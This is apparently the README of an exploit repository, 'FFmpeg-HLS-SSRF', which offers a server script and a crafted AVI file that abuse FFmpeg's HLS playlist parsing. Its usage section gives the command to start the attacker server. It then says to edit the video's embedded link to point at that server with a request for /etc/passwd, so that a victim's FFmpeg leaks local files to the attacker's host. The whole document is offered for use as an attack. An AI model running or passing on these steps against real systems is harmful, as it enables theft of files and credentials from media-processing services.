# FFmpeg-HLS-SSRF
Server and avi file to exploit FFmpeg HLS parse

## Dependencies: python3.5 > 
## Usage:
##### credits: @neex
```
python3 server.py --external-addr <external-ip-of-your-server> --port 8080
modify video.avi so the link inside it will point to your server and be like this: http://<external-ip-of-your-server>:8080/initial.m3u?filename=/etc/passwd
```
